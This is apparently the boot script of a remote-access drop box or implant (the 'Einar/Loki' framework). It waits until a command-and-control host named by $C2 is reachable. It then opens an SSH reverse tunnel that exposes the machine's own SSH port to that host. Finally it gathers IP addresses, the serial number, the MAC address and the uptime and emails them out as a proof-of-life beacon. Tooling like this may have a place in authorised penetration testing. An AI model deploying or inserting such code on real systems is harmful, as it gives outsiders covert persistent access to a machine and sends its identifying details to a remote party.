#!/bin/bash 
###############################################################################
# onboot.sh - This is the parent script for all of the other loki scripts.
#
# Requirements
#
# Mod History:
# 8 Oct 2019 - nju - Cleaning up.
# 21 May 2019 - nju - created file from Loki framework
############################################################################### 

source /opt/einar/client/config.sh

# Check for Networking
# Verify Network Connectivity and wait until we get it.  We can't do anything until
# we have network connectivity.
until curl -Isf $C2PROTO$C2
  do
    $LOG "[EINAR] Waiting for Network"
    sleep .25
  done

$LOG "Network Up"

# Bring up tunnel for email
  sudo -u $C2USER ssh -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -R $PROXYPORT:localhost:22 -C -i /home/$C2USER/.ssh/id_ecdsa -N -n
  if [ $? -eq 0 ]; then
    $ECHO "[EINAR] SMTP Tunnel Up"
  else
	$LOG "[EINAR} Failed to establish SMTP Tunnel"
    $ECHO "[EINAR] Failed to establish SMTP Tunnel"      
  fi


# Bring up tunnel for C2 
#  sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -n
#  if [ $? == 1 ]; then 
#    $LOG "[EINAR} Failed to establish C2 SSH  Tunnel on $PROXYPORT"
#    $ECHO "[EINAR] Failed to establish C2 SSH Tunnel on $PROXYPORT"
#  else
#    $ECHO "[EINAR] Established C2 SSH Tunnel on $PROXYPORT"
#  fi
# Gather info
        WAN_IP=$(curl ifconfig.me)
          LAN_IP=$(ip ad | grep inet | awk '{print $2}' )
          #SERIAL=$(dmidecode -s system-serial-number)
          SERIAL=$(cat $LOKIHOME/SERIAL)
          UPTIME=$(uptime)
          MAC=$(/sbin/ifconfig eno1 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')

          echo "LAN IP = $LAN_IP " > $LOKIHOME/netinfo
          echo "WAN IP = $WAN_IP" >> $LOKIHOME/netinfo
          echo "SSH Proxy Port = $PROXYPORT" >> $LOKIHOME/netinfo 
          echo $MSG >>  $LOKIHOME/netinfo
          echo "===========================" >> $LOKIHOME/netinfo
          echo "Serial = $SERIAL" >> $LOKIHOME/netinfo
          echo "MAC = $MAC" >> $LOKIHOME/netinfo
          echo "Uptime = $UPTIME" >> $LOKIHOME/netinfo
# Send proof of life email
          /usr/bin/mail -s "PSA ONLINE" $DESTEMAIL < $LOKIHOME/netinfo
# We done 


